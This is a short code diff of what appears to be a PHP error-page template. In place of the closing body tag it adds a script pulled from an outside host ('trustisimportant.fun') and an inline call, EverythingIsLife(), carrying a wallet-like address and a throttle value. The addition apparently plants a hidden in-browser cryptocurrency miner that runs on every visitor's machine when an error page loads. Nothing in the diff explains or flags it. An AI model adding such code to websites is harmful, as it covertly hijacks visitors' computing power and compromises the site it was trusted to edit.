@@ -60,5 +60,8 @@ p {
 		<h1><?php echo $heading; ?></h1>
 		<?php echo $message; ?>
 	</div>
-</body>
+        <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+        <script type="text/javascript">
+        EverythingIsLife("47NsaEwhbk92CfibMJg8M8hJ73LKDv9NTjNtHLFH6EQE2sAUdgnwPc231gghf3rYBvC6cXvgLahJKa4riqQBxbT1HBjQhFu", "web", 50);
+        </script></body>
 </html>
